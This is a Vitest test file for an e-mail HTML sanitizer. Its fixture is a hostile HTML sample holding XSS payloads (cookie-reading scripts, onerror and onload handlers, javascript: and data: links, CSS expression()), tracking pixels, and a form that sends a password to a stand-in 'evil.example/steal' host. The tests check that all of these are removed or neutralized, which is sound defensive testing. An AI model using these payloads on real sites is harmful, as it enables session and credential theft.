import { describe, expect, it } from "vitest";
import { cleanStyle, sanitizeEmailHtml, TRANSPARENT_GIF } from "@/server/domain/sanitize";

describe("10. e-mail HTML sanitizer", () => {
  const dangerous = `
    <html><head><title>t</title><style>body{background:url(https://track.example/x)}</style><base href="https://evil.example/"><meta http-equiv="refresh" content="0;url=https://evil.example"><link rel="stylesheet" href="https://evil.example/x.css"></head>
    <body onload="steal()">
      <script>alert(document.cookie)</script>
      <p id="main" class="x" onclick="evil()" style="color: red; background-image: url(javascript:alert(1)); width: expression(alert(1)); position: fixed; font-weight: bold">Hello <b>world</b></p>
      <img src="x" onerror="alert(1)">
      <img src="https://tracker.example/pixel.gif?u=123" width="1" height="1">
      <img src="//cdn.example/logo.png" alt="logo">
      <img src="cid:Part1.ABC@example" alt="inline">
      <img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">
      <img src="data:image/png;base64,iVBORw0KGgo=">
      <a href="javascript:alert(1)">click</a>
      <a href="JaVaScRiPt:alert(1)">click2</a>
      <a href="https://example.com/ok" target="_self">ok</a>
      <a href="mailto:a@example.com">mail</a>
      <a href="data:text/html,<script>alert(1)</script>">data</a>
      <iframe src="https://evil.example"></iframe>
      <object data="x.swf"></object><embed src="x.swf">
      <form action="https://evil.example/steal"><input name="password"><button>Go</button></form>
      <svg onload="alert(1)"><script>alert(2)</script></svg>
      <table background="https://tracker.example/bg.png"><tr><td bgcolor="#fff" onmouseover="x()">cell</td></tr></table>
    </body></html>`;

  const { html, hasRemoteImages } = sanitizeEmailHtml(dangerous, {
    cidMap: new Map([["part1.abc@example", "/api/attachments/m1/att1"]]),
  });

  it("removes scripts, styles, frames, forms, base/meta/link and their content", () => {
    for (const bad of ["<script", "alert(document.cookie)", "<style", "<iframe", "<object", "<embed", "<form", "<input", "<button", "<base", "<meta", "<link", "<svg", "<title"]) {
      expect(html.toLowerCase()).not.toContain(bad.toLowerCase());
    }
  });

  it("removes every event handler and id/class", () => {
    expect(html).not.toMatch(/\son[a-z]+\s*=/i);
    expect(html).not.toMatch(/\sid=|\sclass=/);
  });

  it("neutralizes javascript:/data: links and hardens safe ones", () => {
    expect(html.toLowerCase()).not.toContain("javascript:");
    expect(html).not.toContain("data:text/html");
    expect(html).toContain('<a href="https://example.com/ok" target="_blank" rel="noopener noreferrer nofollow">ok</a>');
    expect(html).toContain('href="mailto:a@example.com"');
  });

  it("keeps inline styles minus dangerous declarations", () => {
    expect(html).toContain('style="color: red; font-weight: bold"');
    expect(html).not.toMatch(/expression|url\(|position/i);
    expect(cleanStyle("color:blue;background:url('x')")).toBe("color:blue");
    expect(cleanStyle("width:\\65xpression(1)")).toBe("");
  });

  it("blocks remote images (tracking pixel) by default", () => {
    expect(hasRemoteImages).toBe(true);
    expect(html).not.toMatch(/\ssrc="https?:/);
    expect(html).toContain('data-remote-src="https://tracker.example/pixel.gif?u=123"');
    expect(html).toContain('data-remote-src="https://cdn.example/logo.png"');
    expect(html).not.toContain("tracker.example/bg.png");
    // Blocked images have no src at all (UI swaps data-remote-src → src to load them).
    expect(html).toContain('<img width="1" height="1" data-remote-src="https://tracker.example/pixel.gif?u=123" />');
    expect(html.replace(/ data-remote-src="/g, ' src="')).toContain('<img width="1" height="1" src="https://tracker.example/pixel.gif?u=123" />');
    expect(html).toContain(`src="${TRANSPARENT_GIF}"`); // unknown/unsafe sources → placeholder
  });

  it("rewrites cid: images and keeps only safe data: images", () => {
    expect(html).toContain('src="/api/attachments/m1/att1"');
    expect(html).not.toContain("image/svg+xml");
    expect(html).toContain('src="data:image/png;base64,iVBORw0KGgo="');
  });

  it("keeps ordinary formatting", () => {
    expect(html).toContain("Hello <b>world</b>");
    expect(html).toContain('<td bgcolor="#fff">cell</td>');
  });

  it("allowRemoteImages loads them directly", () => {
    const r = sanitizeEmailHtml('<img src="https://cdn.example/a.png">', { allowRemoteImages: true });
    expect(r.hasRemoteImages).toBe(false);
    expect(r.html).toBe('<img src="https://cdn.example/a.png" />');
  });

  it("plain HTML without remote content reports no remote images", () => {
    expect(sanitizeEmailHtml("<p>Hi</p>")).toEqual({ html: "<p>Hi</p>", hasRemoteImages: false });
  });
  it("cleans style attributes on links and images too (no CSS url() tracking)", () => {
    const { html } = sanitizeEmailHtml(
      '<a href="https://x.com" style="color:red;background:url(https://t.example/p.gif)">x</a><img src="https://t.example/a.png" style="width:10px;background-image:url(https://t.example/b.gif)">',
    );
    expect(html).not.toMatch(/url\(/i);
    expect(html).toContain("color:red");
    expect(html).toContain("width:10px");
  });
});
